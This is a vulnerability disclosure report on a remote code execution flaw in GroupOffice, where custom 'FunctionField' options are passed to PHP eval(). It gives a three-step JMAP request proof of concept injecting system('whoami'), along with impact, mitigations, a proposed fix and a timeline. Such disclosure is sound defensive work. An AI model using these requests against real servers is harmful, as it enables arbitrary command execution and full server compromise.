---
title: CVE XXXX-XXXXX
date: 2025-09-30 12:14:12 +1
categories: [CVE]
tags: [CVE, RCE]
---

# GroupOffice Remote Code Execution Vulnerability Report

## Executive Summary

A critical Remote Code Execution (RCE) vulnerability has been discovered in GroupOffice that allows authenticated users with custom field management privileges to execute arbitrary PHP code on the server. This vulnerability affects the custom field functionality and can lead to complete server compromise.

## Vulnerability Details

**Product**: GroupOffice  
**Affected Component**: Custom Field Function Field Type  
**Vulnerability Type**: Remote Code Execution (RCE)  
**Severity**: Critical (CVSS 3.1: 9.1)  
**Authentication Required**: Yes (with `mayChangeCustomFields` permission)  
**CVE ID**: Pending Assignment  

## Technical Description

The vulnerability exists in the `FunctionField` class located at `/www/go/core/customfield/FunctionField.php`. The `dbToApi()` method uses PHP's `eval()` function to execute user-controlled input without proper sanitization:

```php
// Line 65 in FunctionField.php
eval("\$result = " . $f . ";");
```

The variable `$f` contains the value from `$this->field->getOption("function")`, which is directly controlled by users who can create or modify custom fields of type "FunctionField".

## Proof of Concept

### Step 1: Create a FieldSet
```json
POST /api/jmap.php HTTP/1.1
Content-Type: application/json

[
    ["FieldSet/set", {
      "create": {
        "temp1": {
          "name": "Test FieldSet",
          "entity": "Contact"
        }
      }
    }, "c1"]
]
```

### Step 2: Create Malicious FunctionField
```json
POST /api/jmap.php HTTP/1.1
Content-Type: application/json

[
    ["Field/set", {
      "create": {
        "temp1": {
          "name": "Calculator Field",
          "fieldSetId": "1",
          "type": "FunctionField",
          "databaseName": "calc_field",
          "options": {
            "function": "system('whoami'); 42"
          },
          "sortOrder": 1
        }
      }
    }, "c1"]
]
```

### Step 3: Trigger Code Execution
```json
POST /api/jmap.php HTTP/1.1
Content-Type: application/json

[
    ["Contact/get", {
      "ids": null,
      "properties": ["id", "name", "customFields"]
    }, "c1"]
]
```

### Expected Result
The server executes the `whoami` command and returns the result in the custom field value, demonstrating successful code execution.

## Impact Assessment

- **Complete Server Compromise**: Attackers can execute arbitrary system commands
- **Data Exfiltration**: Access to sensitive files and database contents
- **Lateral Movement**: Potential to compromise other systems on the network
- **Service Disruption**: Ability to modify or delete critical system files
- **Privilege Escalation**: Depending on web server configuration

## Affected Versions

This vulnerability affects GroupOffice installations that include the custom fields functionality. The exact version range needs to be determined by the development team.

## Prerequisites for Exploitation

1. Valid authentication to GroupOffice
2. User account with `mayChangeCustomFields` permission
3. Access to entities that support custom fields (Contacts, Notes, Tasks, etc.)

## Mitigation Recommendations

### Immediate Actions
1. **Disable FunctionField Type**: Remove or disable the FunctionField custom field type
2. **Review Permissions**: Audit users with `mayChangeCustomFields` permissions
3. **Monitor Logs**: Check for suspicious custom field creation activities

### Long-term Fixes
1. **Remove eval() Usage**: Replace `eval()` with a safe mathematical expression parser
2. **Input Validation**: Implement strict validation for function field expressions
3. **Sandboxing**: If mathematical expressions are needed, use a sandboxed parser library
4. **Code Review**: Audit all instances of `eval()`, `system()`, `exec()` in the codebase

## Proposed Fix

Replace the vulnerable code in `FunctionField.php`:

```php
// VULNERABLE CODE (Line 65)
eval("\$result = " . $f . ";");


// SECURE ALTERNATIVE
try {
    // Use a safe mathematical expression evaluator
    $parser = new MathExpressionParser();
    $result = $parser->evaluate($f);
} catch (Exception $e) {
    $result = null;
}
```

## Timeline

- **Discovery Date**: 2025-08-28
- **Vendor Notification**: 2025-08-29
- **Vendor Response**: Yes
- **Fix Released**: Fixed in 25.0.47 and 6.8.136

## Credit

Discovered by: Noah "nxvh" Heraud  
Contact: heraud260@gmail.com  

## Responsible Disclosure

This vulnerability is being reported following responsible disclosure practices. We request:

1. Acknowledgment of this report within 5 business days
2. Regular updates on remediation progress
3. Credit in security advisories and release notes
4. Coordination on public disclosure timing

## References

- [GroupOffice Official Website](https://www.group-office.com/)
- [OWASP Code Injection Prevention](https://owasp.org/www-community/attacks/Code_Injection)
- [CWE-94: Improper Control of Generation of Code](https://cwe.mitre.org/data/definitions/94.html)
